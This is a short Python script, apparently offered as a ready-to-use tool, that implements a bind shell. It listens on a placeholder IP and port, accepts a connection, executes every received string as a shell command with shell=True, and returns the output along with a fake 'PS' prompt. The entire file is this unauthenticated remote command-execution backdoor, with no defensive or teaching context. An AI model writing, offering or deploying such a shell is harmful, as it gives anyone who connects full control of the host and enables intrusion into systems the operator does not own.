import socket
import subprocess

# Replace IP and port with the IP and port of the server you want to listen on
IP = "IP"
PORT = PORT

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the IP and port
s.bind((IP, PORT))

# Listen for incoming connections
s.listen(1)
print("[*] Listening for incoming connections on %s:%d" % (IP, PORT))

# Accept the incoming connection
conn, addr = s.accept()
print("[*] Connection from: %s:%d" % (addr[0], addr[1]))

# Create a new shell
while True:
    # Receive the data
    data = conn.recv(1024)
    # Decode the data and strip newline characters
    data = data.decode().strip()
    # If the data is not empty
    if data:
        # Run the command and store the output
        output = subprocess.run(data, shell=True, capture_output=True)
        # Send the output back to the client
        conn.send(output.stdout)
    # If the data is empty, send a new command prompt
    else:
        conn.send(b"PS " + subprocess.run("cd", shell=True, capture_output=True).stdout + b"> ")

# Close the connection
conn.close()
